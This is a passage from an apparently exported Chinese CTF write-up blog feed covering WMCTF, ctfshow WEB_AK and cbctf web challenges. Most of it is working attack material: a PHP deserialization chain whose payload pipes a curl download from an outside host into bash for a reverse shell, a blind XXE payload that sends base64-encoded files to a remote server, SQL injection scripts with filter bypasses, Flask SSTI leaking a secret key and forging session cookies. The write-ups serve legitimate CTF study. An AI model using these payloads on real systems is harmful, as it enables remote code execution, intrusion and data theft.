class="hljs-keyword">function</span> <span class="hljs-title">offsetExists</span>(<span class="hljs-params"><span class="hljs-variable">$offset</span></span>)</span>&#123;&#125;         <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">offsetGet</span>(<span class="hljs-params"><span class="hljs-variable">$offset</span></span>)</span>&#123;&#125;         <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">offsetSet</span>(<span class="hljs-params"><span class="hljs-variable">$offset</span>, <span class="hljs-variable">$value</span></span>)</span>&#123;&#125;         <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">offsetUnset</span>(<span class="hljs-params"><span class="hljs-variable">$offset</span></span>)</span>&#123;&#125;         <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getIterator</span>(<span class="hljs-params"></span>)</span>&#123;&#125;        &#125; &#125; <span class="hljs-keyword">namespace</span>&#123; $<span class="hljs-title">SQLMapper</span>=<span class="hljs-title">new</span> <span class="hljs-title">DB</span>\<span class="hljs-title">SQL</span>\<span class="hljs-title">Mapper</span>(); <span class="hljs-variable">$MongoMapper</span>=<span class="hljs-keyword">new</span> DB\Mongo\Mapper(<span class="hljs-variable">$SQLMapper</span>,<span class="hljs-string">&quot;curl https://shell.now.sh/39.106.207.66:2333 |bash&quot;</span>); <span class="hljs-variable">$DBMongo</span>=<span class="hljs-keyword">new</span> DB\Mongo(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;disconnect&#x27;</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-variable">$MongoMapper</span>,<span class="hljs-string">&quot;insert&quot;</span>))); <span class="hljs-variable">$Agent</span>=<span class="hljs-keyword">new</span> CLI\Agent(<span class="hljs-variable">$DBMongo</span>); <span class="hljs-variable">$WS</span>=<span class="hljs-keyword">new</span> CLI\WS(); <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$WS</span>,<span class="hljs-variable">$Agent</span>))); &#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WMCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow WEB_AK赛</title>
    <link href="/2020/07/31/ctfshow-WEB-AK%E8%B5%9B/"/>
    <url>/2020/07/31/ctfshow-WEB-AK%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="签到-观己"><a href="#签到-观己" class="headerlink" title="签到_观己"></a>签到_观己</h1><p>包含/var/log/nginx/access.log 日志getshell</p><h1 id="web1-观字"><a href="#web1-观字" class="headerlink" title="web1_观字"></a>web1_观字</h1><p>中文逗号代替英文逗号绕过</p><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">192</span>。<span class="hljs-number">168</span>。<span class="hljs-number">7</span>。<span class="hljs-number">68</span>/flag</code></pre><h1 id="web2-观星"><a href="#web2-观星" class="headerlink" title="web2_观星"></a>web2_观星</h1><p>注入猜flag列</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str_to_hex</span>(<span class="hljs-params">s</span>):</span>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s])url = <span class="hljs-string">&#x27;http://888e2052-a997-47d3-9060-7538f73e4257.chall.ctf.show/index.php?id=1/((select group_concat(flag) from flag)&gt; BINARY (select 0x&#123;&#125;))&#x27;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp2</span>():</span>    str1 = <span class="hljs-string">&quot;-0123456789_abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&quot;</span>    flag = <span class="hljs-string">&#x27;flag&#123;&#x27;</span>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">60</span>):        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> str1:            i = flag+i            payload = url.<span class="hljs-built_in">format</span>(str_to_hex(i+<span class="hljs-string">&quot;~&quot;</span>))            payload=payload.replace(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;/**/&#x27;</span>)            <span class="hljs-comment"># print(payload)</span>            r = requests.post(url=payload)            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Rudyard&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r.text:                flag=i                print(flag)                <span class="hljs-keyword">break</span>exp2()</code></pre><h1 id="web3-观图"><a href="#web3-观图" class="headerlink" title="web3_观图"></a>web3_观图</h1><p>爆破密匙</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">99999</span>;<span class="hljs-variable">$i</span>++)&#123;    <span class="hljs-variable">$key</span> = substr(md5(<span class="hljs-string">&#x27;ctfshow&#x27;</span>.<span class="hljs-variable">$i</span>),<span class="hljs-number">3</span>,<span class="hljs-number">8</span>);    <span class="hljs-variable">$image</span>=<span class="hljs-string">&quot;Z6Ilu83MIDw=&quot;</span>;    <span class="hljs-variable">$str</span> = openssl_decrypt(<span class="hljs-variable">$image</span>, <span class="hljs-string">&#x27;bf-ecb&#x27;</span>, <span class="hljs-variable">$key</span>);    <span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$str</span>,<span class="hljs-string">&quot;gif&quot;</span>) <span class="hljs-keyword">or</span> strpos(<span class="hljs-variable">$str</span>,<span class="hljs-string">&quot;jpg&quot;</span>) <span class="hljs-keyword">or</span> strpos(<span class="hljs-variable">$str</span>,<span class="hljs-string">&quot;png&quot;</span>))&#123;        <span class="hljs-keyword">print</span>(<span class="hljs-variable">$str</span>);        <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;\n&quot;</span>;        <span class="hljs-keyword">print</span>(<span class="hljs-variable">$key</span>);        <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;\n&quot;</span>;        <span class="hljs-keyword">print</span> openssl_encrypt(<span class="hljs-string">&quot;config.php&quot;</span>,<span class="hljs-string">&#x27;bf-ecb&#x27;</span>, <span class="hljs-variable">$key</span>);        <span class="hljs-keyword">break</span>;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>带进去访问就行</p><h1 id="web4-观心"><a href="#web4-观心" class="headerlink" title="web4_观心"></a>web4_观心</h1><p>api.php盲xxe，结果在报错中</p><pre><code class="hljs routeros">api.php  post<span class="hljs-attribute">api</span>=自己服务器上xml文件</code></pre><p>回显在返红包中，这里给个payload,</p><pre><code class="hljs mojolicious"><span class="xml">#payload.xml</span><span class="xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">convert</span> [ </span></span><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">remote</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://ip/test.dtd&quot;</span>&gt;</span></span><span class="perl">%remote;%int;%send;</span><span class="xml">]&gt;</span><span class="xml">#test.dtd</span><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;php://filter/read=convert.base64-encode/resource=&quot;</span>&gt;</span></span><span class="xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">int</span> <span class="hljs-meta-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://ip/?p=%file;&#x27;&gt;&quot;</span>&gt;</span></span><span class="xml">写成两个文件放服务器上</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfshow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cbctf</title>
    <link href="/2020/07/29/cbctf/"/>
    <url>/2020/07/29/cbctf/</url>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="尖尖的商店-amp-尖尖的商店2-0"><a href="#尖尖的商店-amp-尖尖的商店2-0" class="headerlink" title="尖尖的商店&amp;尖尖的商店2.0"></a>尖尖的商店&amp;尖尖的商店2.0</h2><p>签到题，题目是购买flag，但是只有1000块买不了</p><p><img src="https://s1.ax1x.com/2020/07/29/amHcgH.png" alt="amHcgH.png"></p><p>抓包看一下什么决定余额</p><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /buy/<span class="hljs-number">3</span> HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: checkin.race<span class="hljs-number">2020</span>.<span class="hljs-number">0</span>rays.club<span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>; rv:<span class="hljs-number">79</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">79</span>.<span class="hljs-number">0</span><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Referer</span>: http://checkin.race<span class="hljs-number">2020</span>.<span class="hljs-number">0</span>rays.club/<span class="hljs-attribute">Cookie</span>: money=<span class="hljs-number">1000</span><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span></code></pre><p>可以看到是Cookie中money决定了钱，改一下就可以买到了flag了</p><p>商店2.0抓包Cookie为</p><pre><code class="hljs apache"><span class="hljs-attribute">Cookie</span>: session=eyJtb<span class="hljs-number">25</span>leSI<span class="hljs-number">6</span>IjEwMDAifQ.Xx-Vcw.hnW<span class="hljs-number">8</span>Q<span class="hljs-number">0</span>BGOJR_<span class="hljs-number">6</span>D<span class="hljs-number">7</span>U<span class="hljs-number">16</span>M<span class="hljs-number">0</span>tdt<span class="hljs-number">0</span>cKs</code></pre><p>为flask_session，base64解一下前面的一段有{“money”:”1000”} 但是没有SECRET_KEY伪造不了</p><p>根据hint，在404页面Referer头处会有ssti，读取config</p><pre><code class="hljs"><span class="hljs-attribute">Referer</span>: http://checkin2.race2020.0rays.club/&#123;&#123;config&#125;&#125;&lt;Config &#123;&#x27;TRAP_HTTP_EXCEPTIONS&#x27;: False, &#x27;SEND_FILE_MAX_AGE_DEFAULT&#x27;: datetime.timedelta(0, 43200), &#x27;TEMPLATES_AUTO_RELOAD&#x27;: None, &#x27;SESSION_REFRESH_EACH_REQUEST&#x27;: True, &#x27;JSON_AS_ASCII&#x27;: True, &#x27;SESSION_COOKIE_SAMESITE&#x27;: None, &#x27;JSONIFY_MIMETYPE&#x27;: &#x27;application/json&#x27;, &#x27;USE_X_SENDFILE&#x27;: False, &#x27;JSON_SORT_KEYS&#x27;: True, &#x27;DEBUG&#x27;: False, &#x27;SESSION_COOKIE_DOMAIN&#x27;: False, &#x27;SESSION_COOKIE_HTTPONLY&#x27;: True, &#x27;SESSION_COOKIE_NAME&#x27;: &#x27;session&#x27;, &#x27;EXPLAIN_TEMPLATE_LOADING&#x27;: False, &#x27;SESSION_COOKIE_PATH&#x27;: None, &#x27;MAX_COOKIE_SIZE&#x27;: 4093, &#x27;PROPAGATE_EXCEPTIONS&#x27;: None, &#x27;TESTING&#x27;: False, &#x27;APPLICATION_ROOT&#x27;: &#x27;/&#x27;, &#x27;TRAP_BAD_REQUEST_ERRORS&#x27;: None, &#x27;PRESERVE_CONTEXT_ON_EXCEPTION&#x27;: None, &#x27;ENV&#x27;: &#x27;production&#x27;, &#x27;MAX_CONTENT_LENGTH&#x27;: None, &#x27;SECRET_KEY&#x27;: &#x27;vlmalkdguv923rufkjdsa7823312e&#x27;, &#x27;PERMANENT_SESSION_LIFETIME&#x27;: datetime.timedelta(31), &#x27;SERVER_NAME&#x27;: None, &#x27;PREFERRED_URL_SCHEME&#x27;: &#x27;http&#x27;, &#x27;SESSION_COOKIE_SECURE&#x27;: False, &#x27;JSONIFY_PRETTYPRINT_REGULAR&#x27;: False&#125;&gt;</code></pre><p>‘SECRET_KEY’: ‘vlmalkdguv923rufkjdsa7823312e’,拿到后就能构造cookie</p><pre><code class="hljs stylus">λ python flask_session_cookie_manager3<span class="hljs-selector-class">.py</span> encode -s <span class="hljs-string">&#x27;vlmalkdguv923rufkjdsa7823312e&#x27;</span> -t <span class="hljs-string">&quot;&#123;&#x27;money&#x27;: &#x27;10000000&#x27;&#125;&quot;</span>eyJtb25leSI6IjEwMDAwMDAwIn0<span class="hljs-selector-class">.XyGgcQ</span>.<span class="hljs-number">9</span>iKyPfloHG4qvyyDhitKGnSJOHY</code></pre><p>用这个cookie发过去就能直接买了，脚本直接去github上搜就有了</p><h2 id="Easy-Baby-Signin"><a href="#Easy-Baby-Signin" class="headerlink" title="Easy-Baby-Signin"></a>Easy-Baby-Signin</h2><p>第一步是ctfhub前置技能树一样的题，<a href="https://writeup.ctfhub.com/Skill/Web/%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD/HTTP%E5%8D%8F%E8%AE%AE/c24bba25.html">基础认证</a></p><p>爆破出密码为12345678登录后，观察url</p><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">121.41.13.20:10002</span>/index.php?jpg=TmpZMlF<span class="hljs-number">6</span>WXhOamN<span class="hljs-number">5</span>UlRaQk<span class="hljs-number">56</span>QTJOdz<span class="hljs-number">09</span></code></pre><p>jpg解出来是<code>flag.jpg</code>,解密为base64-&gt;base64-&gt;hex,加密index.php带入进去就能看到源码</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">/*</span><span class="hljs-comment"> do you know magicword.txt?</span><span class="hljs-comment"> */</span>error_reporting(E_ALL || ~E_NOTICE);header(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<span class="hljs-keyword">if</span>(! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;jpg&#x27;</span>]))    header(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&#x27;</span>);<span class="hljs-variable">$file</span> = hex2bin(base64_decode(base64_decode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;jpg&#x27;</span>])));<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;title&gt;&#x27;</span>.<span class="hljs-string">&quot;Hacked_by_whiskey&quot;</span>.<span class="hljs-string">&#x27;&lt;/title&gt;&#x27;</span>;<span class="hljs-variable">$file</span> = preg_replace(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span>);<span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$file</span>,<span class="hljs-string">&#x27;test&#x27;</span>) == <span class="hljs-literal">false</span>)&#123;<span class="hljs-variable">$txt</span> = base64_encode(file_get_contents(<span class="hljs-variable">$file</span>));<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span>.<span class="hljs-variable">$txt</span>.<span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Can you find the flag file?&quot;</span>;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not here!Try again!&quot;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>看到magicword.txt，</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">#atest.php</span><span class="hljs-comment">#GOAL: get the secret;</span>   <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">icanhear</span> </span>&#123;<span class="hljs-keyword">var</span> <span class="hljs-variable">$mykey</span>; <span class="hljs-keyword">var</span> <span class="hljs-variable">$myword</span>;&#125;<span class="hljs-variable">$magicword</span> = unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;magicword&#x27;</span>]);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;just tell me the magicword\n&quot;</span>;<span class="hljs-variable">$magicword</span>-&gt;myword = <span class="hljs-string">&quot;***********&quot;</span>;<span class="hljs-keyword">if</span> (<span class="hljs-variable">$magicword</span>-&gt;myword === <span class="hljs-variable">$magicword</span>-&gt;mykey)         <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sooooo close: &quot;</span>.<span class="hljs-variable">$magicword</span>-&gt;myword;     <span class="hljs-keyword">else</span>         <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Damn  it !&quot;</span>;         <span class="hljs-meta">?&gt;</span></code></pre><p>反序列化利用php中的引用(&amp;不同的名字访问同一个变量内容),payload</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">icanhear</span> </span>&#123;<span class="hljs-keyword">var</span> <span class="hljs-variable">$mykey</span>; <span class="hljs-keyword">var</span> <span class="hljs-variable">$myword</span>;&#125;<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> icanhear();<span class="hljs-variable">$a</span>-&gt;mykey=&amp;<span class="hljs-variable">$a</span>-&gt;myword;<span class="hljs-keyword">echo</span>  serialize(<span class="hljs-variable">$a</span>);</code></pre><p>访问<code>/atest.php?magicword=O:8:&quot;icanhear&quot;:2:&#123;s:5:&quot;mykey&quot;;N;s:6:&quot;myword&quot;;R:2;&#125;</code>得到<code>hEre_flAg.php</code>,终极套娃</p><pre><code class="hljs routeros">flag1 = <span class="hljs-string">&#x27;flag&#123;wa0_&#x27;</span>;int(<span class="hljs-string">&#x27;flag2&#x27;</span>);<span class="hljs-keyword">if</span> md5(<span class="hljs-string">&#x27;flag2&#x27;</span>)[:6]==<span class="hljs-string">&#x27;1024cc&#x27;</span>;<span class="hljs-builtin-name">print</span>(<span class="hljs-string">&#x27;yes,yes&#x27;</span>);flag3 = <span class="hljs-string">&#x27;_is_right&#125;&#x27;</span>;<span class="hljs-attribute">flag</span>=flag1+flag2+flag3;just here!flag2 is the first number!</code></pre><p>python脚本爆破一下</p><pre><code class="hljs apache"><span class="hljs-attribute">import</span> hashlib<span class="hljs-attribute">for</span> i in range(<span class="hljs-number">0</span>,<span class="hljs-number">1000000000</span>):    <span class="hljs-attribute">s</span> = hashlib.md<span class="hljs-number">5</span>(str(i).encode(&#x27;UTF-<span class="hljs-number">8</span>&#x27;)).hexdigest()[:<span class="hljs-number">6</span>]    <span class="hljs-comment"># print(s)</span>    <span class="hljs-attribute">if</span> s == <span class="hljs-string">&quot;1024cc&quot;</span>:      <span class="hljs-attribute">print</span>(i)<span class="hljs-comment"># 7900588</span></code></pre><p>flag{wa0_7900588_is_right}</p><h2 id="朴实无华sqllab"><a href="#朴实无华sqllab" class="headerlink" title="朴实无华sqllab"></a>朴实无华sqllab</h2><p>给到了源码</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">//including the Mysql connect parameters.</span>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-string">&quot;On&quot;</span>); error_reporting(E_ALL | E_STRICT);<span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;./sql-connections/db-creds.inc&quot;</span>);    <span class="hljs-variable">$con1</span> = mysqli_connect(<span class="hljs-variable">$host</span>,<span class="hljs-variable">$dbuser</span>,<span class="hljs-variable">$dbpass</span>,<span class="hljs-variable">$dbname</span>);    <span class="hljs-variable">$con2</span> =mysqli_select_db(<span class="hljs-variable">$con1</span>,<span class="hljs-variable">$dbname1</span>);<span class="hljs-comment">// take the variables </span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))&#123;<span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<span class="hljs-comment">//fiddling with comments</span><span class="hljs-variable">$res</span>= blacklist(<span class="hljs-variable">$id</span>);<span class="hljs-keyword">if</span>(!<span class="hljs-variable">$res</span>) <span class="hljs-keyword">die</span>();<span class="hljs-comment">//echo &quot;&lt;br&gt;&quot;;</span><span class="hljs-comment">//echo &quot;&lt;br&gt;&quot;;</span><span class="hljs-comment">// connectivity </span><span class="hljs-comment">//    echo &quot;success!\n&quot;;</span>    <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM user WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; &quot;</span>;<span class="hljs-variable">$result</span>=mysqli_query(<span class="hljs-variable">$con1</span>,<span class="hljs-variable">$sql</span>);<span class="hljs-variable">$row</span> = mysqli_fetch_array(<span class="hljs-variable">$result</span>);<span class="hljs-keyword">if</span>(<span class="hljs-number">0</span>)&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Login name:&#x27;</span>. <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;user&#x27;</span>];  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your pass:&#x27;</span> .<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;pass&#x27;</span>];  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&quot;</span>;  &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">blacklist</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span><span class="hljs-function"></span>&#123;<span class="hljs-variable">$res</span> = preg_match(<span class="hljs-string">&#x27;/\\&amp;|or|,|and| |\||\/\*\*\/|sleep|benchmark|%|flag/i&#x27;</span>,<span class="hljs-variable">$id</span>);<span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>)&#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>;&#125;&#125;</code></pre><p>可以看到过滤了非常多的东西，并且因为if(0)完全没有回显，考虑盲注。首先验证延时，sleep函数都禁用了，</p><p>参考<a href="https://xz.aliyun.com/t/5505%E4%BB%A5%E5%8F%8Ahint%EF%BC%8C%E9%87%87%E7%94%A8%E7%AC%9B%E5%8D%A1%E5%B0%94%E7%A7%AF%E7%9B%B2%E6%B3%A8%EF%BC%8C%E6%8E%A5%E4%B8%8B%E6%9D%A5%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%9E%84%E9%80%A0">https://xz.aliyun.com/t/5505以及hint，采用笛卡尔积盲注，接下来一步一步构造</a></p><pre><code class="hljs sqf">语句 $sql=<span class="hljs-string">&quot;SELECT * FROM user WHERE id=&#x27;$id&#x27; &quot;</span>;这里空格，<span class="hljs-built_in">and</span> <span class="hljs-keyword">if</span> 逗号 <span class="hljs-built_in">sleep</span> 全禁了，得绕空格 -&gt; <span class="hljs-comment">/*2*/</span> ,因为<span class="hljs-comment">/**/</span>也被禁用<span class="hljs-built_in">and</span> -&gt; id=<span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-number">1</span> 等于号替换，与id=<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-built_in">and</span> <span class="hljs-number">1</span>意思相同<span class="hljs-keyword">if</span>  -&gt; <span class="hljs-keyword">case</span>语句代替<span class="hljs-built_in">sleep</span> -&gt;  <span class="hljs-built_in">SELECT</span> <span class="hljs-built_in">count</span>(*) <span class="hljs-keyword">FROM</span> user a inner <span class="hljs-built_in">join</span> user b....做笛卡尔积 / mysql种 cross <span class="hljs-built_in">join</span> ,inner <span class="hljs-built_in">join</span>和 <span class="hljs-built_in">join</span>实现功能一样，所以这里可以代替使用笛卡尔积这里选用数据行数多的表，可能是由于题的原因，我用了两个表 user和mysql.help_relation才延时成功，单用mysql.help_relation或者user表都没成，很奇怪(<span class="hljs-built_in">SELECT</span><span class="hljs-comment">/*2*/</span><span class="hljs-built_in">count</span>(*)<span class="hljs-comment">/*2*/</span><span class="hljs-keyword">FROM</span><span class="hljs-comment">/*2*/</span>user<span class="hljs-comment">/*2*/</span>A<span class="hljs-comment">/*2*/</span><span class="hljs-built_in">join</span><span class="hljs-comment">/*2*/</span>mysql.help_relation<span class="hljs-comment">/*2*/</span>o<span class="hljs-comment">/*2*/</span><span class="hljs-built_in">join</span><span class="hljs-comment">/*2*/</span>mysql.help_relation<span class="hljs-comment">/*2*/</span>p)<span class="hljs-string">&#x27;=(case when 1&gt;2 then 1 else sleep(2)end)%23</span><span class="hljs-string">把sleep(2)换掉上面这个就成了</span><span class="hljs-string"></span><span class="hljs-string"></span><span class="hljs-string">1&#x27;</span>=(<span class="hljs-keyword">case</span><span class="hljs-comment">/*2*/</span>when<span class="hljs-comment">/*2*/</span><span class="hljs-number">1</span>&gt;<span class="hljs-number">2</span><span class="hljs-comment">/*2*/</span><span class="hljs-keyword">then</span><span class="hljs-comment">/*2*/</span><span class="hljs-number">1</span><span class="hljs-comment">/*2*/</span><span class="hljs-keyword">else</span><span class="hljs-comment">/*2*/</span>(<span class="hljs-built_in">SELECT</span><span class="hljs-comment">/*2*/</span><span class="hljs-built_in">count</span>(*)<span class="hljs-comment">/*2*/</span><span class="hljs-keyword">FROM</span><span class="hljs-comment">/*2*/</span>user<span class="hljs-comment">/*2*/</span>A<span class="hljs-comment">/*2*/</span><span class="hljs-built_in">join</span><span class="hljs-comment">/*2*/</span>mysql.help_relation<span class="hljs-comment">/*2*/</span>o<span class="hljs-comment">/*2*/</span><span class="hljs-built_in">join</span><span class="hljs-comment">/*2*/</span>mysql.help_relation<span class="hljs-comment">/*2*/</span>p)end)%<span class="hljs-number">23</span></code></pre><p>1&gt;2判断的地方换成payload就可以盲注了，这里我用的查询方法这种比较注出来的。</p><pre><code class="hljs n1ql">(<span class="hljs-keyword">select</span> flag <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>) &gt; <span class="hljs-keyword">BINARY</span> <span class="hljs-string">&quot;1~&quot;</span></code></pre><p>例如数据库种查询的东西为flag，”flag”&gt;”g<del>“为真，”flag”&gt;”f</del>“假，进入延时。加个BINARY区分大小写</p><p>查询数据库的话可以用mysql.innodb_table_stats表，但是sql库里面只有user一个表，flag大概率也在这个表，但是不知道列名，用无列名注入</p><pre><code class="hljs awk">(select<span class="hljs-regexp">/*2*/g</span>roup_concat(`<span class="hljs-number">4</span>`)<span class="hljs-regexp">/*2*/</span>from<span class="hljs-regexp">/*2*/</span>(select*from((select<span class="hljs-regexp">/*2*/</span><span class="hljs-number">1</span>)b<span class="hljs-regexp">/*2*/</span>join<span class="hljs-regexp">/*2*/</span>(select<span class="hljs-regexp">/*2*/</span><span class="hljs-number">2</span>)ab<span class="hljs-regexp">/*2*/</span>join<span class="hljs-regexp">/*2*/</span>(select<span class="hljs-regexp">/*2*/</span><span class="hljs-number">3</span>)ac<span class="hljs-regexp">/*2*/</span>join<span class="hljs-regexp">/*2*/</span>(select<span class="hljs-regexp">/*2*/</span><span class="hljs-number">4</span>)ad)<span class="hljs-regexp">/*2*/u</span>nion<span class="hljs-regexp">/*2*/</span>select<span class="hljs-regexp">/*2*/</span>*<span class="hljs-regexp">/*2*/</span>from<span class="hljs-regexp">/*2*/u</span>ser)aa)</code></pre><p>附上脚本</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> time<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str_to_hex</span>(<span class="hljs-params">s</span>):</span>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s])url = <span class="hljs-string">&quot;http://47.56.137.217:10002/?id=1&#x27;=&quot;</span><span class="hljs-comment"># print(requests.post(url,data=payload).text)</span>x=<span class="hljs-string">&quot;4,flag&#123;0ur_daTaBase_1&quot;</span> <span class="hljs-comment"># user ? 